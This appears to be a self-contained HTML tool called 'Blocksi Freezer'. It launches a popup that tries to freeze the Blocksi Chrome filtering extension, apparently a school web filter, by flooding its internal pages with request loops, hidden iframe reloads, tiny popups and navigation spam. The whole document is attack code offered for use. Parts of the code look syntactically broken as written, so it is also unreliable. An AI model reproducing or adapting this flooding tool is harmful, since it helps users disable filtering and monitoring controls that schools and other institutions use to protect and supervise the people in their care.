<!DOCTYPE html>
<html>
<head>
  <title>Blocksi Freezer</title>
  <style>
    body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 20px; text-align: center; }
    button { background: #da3633; color: white; border: none; padding: 15px 30px; font-size: 20px; cursor: pointer; border-radius: 4px; }
    button:hover { background: #f85149; }
    .note { margin-top: 15px; color: #ffa657; }
  </style>
</head>
<body>
  <h1>Blocksi Freezer</h1>
  <p>Opens a persistent popup. Close this main tab safely after clicking.</p>
  <button id="startBtn">LAUNCH POPUP ATTACK</button>
  <p class="note" id="status">Click the button above.</p>

  <script>
    document.getElementById('startBtn').addEventListener('click', function() {
      const popup = window.open('about:blank', '_blank', 'popup=1,menubar=no,toolbar=no,location=no,status=no,resizable=no,scrollbars=no,width=400,height=150');
      if (!popup) {
        document.getElementById('status').innerHTML = 'Popup blocked! Please allow popups for this site and try again.';
        return;
      }
      document.getElementById('status').innerHTML = 'Popup launched! You can close this tab now.';

      const attackScript = `
        const BLOCKSI_ID = 'ghlpmldmjjhmdgmneoaibbegkjjbonbk';
        const TARGETS = [
          'chrome-extension://' + BLOCKSI_ID + '/manifest.json',
          'chrome-extension://' + BLOCKSI_ID + '/blockPage.html',
          'chrome-extension://' + BLOCKSI_ID + '/background.js',
          'chrome-extension://' + BLOCKSI_ID + '/sw.js',
          'chrome-extension://' + BLOCKSI_ID + '/service-worker.js',
          'chrome-extension://' + BLOCKSI_ID + '/_generated_background_page.html'
        ];

        function log(msg) {
          const el = document.getElementById('log');
          if (el) el.innerHTML += msg + '<br>';
        }

        function startWorkerAttack() {
          const workerCode = '
            const TARGETS = ' + JSON.stringify(TARGETS) + ';
            let counter = 0;
            function flood() {
              const url = TARGETS[counter % TARGETS.length];
              counter++;
              fetch(url, { mode: 'no-cors', cache: 'reload' }).catch(() => {});
              setTimeout(flood, 0);
            }
            for(let i = 0; i < 10; i++) {
              setTimeout(flood, i * 1);
            }
            setInterval(() => {
              const url = TARGETS[Math.floor(Math.random() * TARGETS.length)];
              const xhr = new XMLHttpRequest();
              xhr.open('GET', url, true);
              xhr.send();
            }, 0);
          ';
          const blob = new Blob([workerCode], { type: 'application/javascript' });
          const workerUrl = URL.createObjectURL(blob);
          const worker = new Worker(workerUrl);
          log('✅ Worker flood started.');
        }

        function startIframeAttack() {
          let iframes = [];
          for (let i = 0; i < 20; i++) {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = TARGETS[i % TARGETS.length] + '?init=' + i;
            document.body.appendChild(iframe);
            iframes.push(iframe);
          }
          function reloadAll() {
            for (let iframe of iframes) {
              const url = TARGETS[Math.floor(Math.random() * TARGETS.length)];
              iframe.src = url + '?r=' + Math.random() + '&t=' + Date.now();
            }
            setTimeout(reloadAll, 0);
          }
          setTimeout(reloadAll, 10);
          log('✅ Iframe flood started.');
        }

        function startPopupAttack() {
          let count = 0;
          setInterval(() => {
            const url = TARGETS[count % TARGETS.length];
            const win = window.open(url, '_blank', 'width=1,height=1');
            if (win) {
              setTimeout(() => {
                try { win.close(); } catch(e) {}
              }, 5);
            }
            count++;
          }, 10);
          log('✅ Popup spam started.');
        }

        function startNavigationAttack() {
          const navFrame = document.createElement('iframe');
          navFrame.style.display = 'none';
          document.body.appendChild(navFrame);
          setInterval(() => {
            const url = TARGETS[Math.floor(Math.random() * TARGETS.length)] + '?nav=' + Date.now();
            try {
              navFrame.contentWindow.location.replace(url);
            } catch(e) {}
          }, 0);
          log('✅ Navigation spam started.');
        }

        document.write('
          <html>
            <head><title>Blocksi Freezer Running</title>
            <style>body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:10px;}#log{font-size:12px;height:100px;overflow:auto;}</style>
            </head>
            <body>
              <h3 style="margin:0;color:#3fb950;">⚡ Freezing Blocksi...</h3>
              <div id="log">[System] Attacks engaged.<br></div>
            </body>
          </html>
        ');

        startWorkerAttack();
        startIframeAttack();
        startPopupAttack();
        startNavigationAttack();
      `;

      popup.document.write(attackScript);
      popup.document.close();
    });
  </script>
</body>
</html>
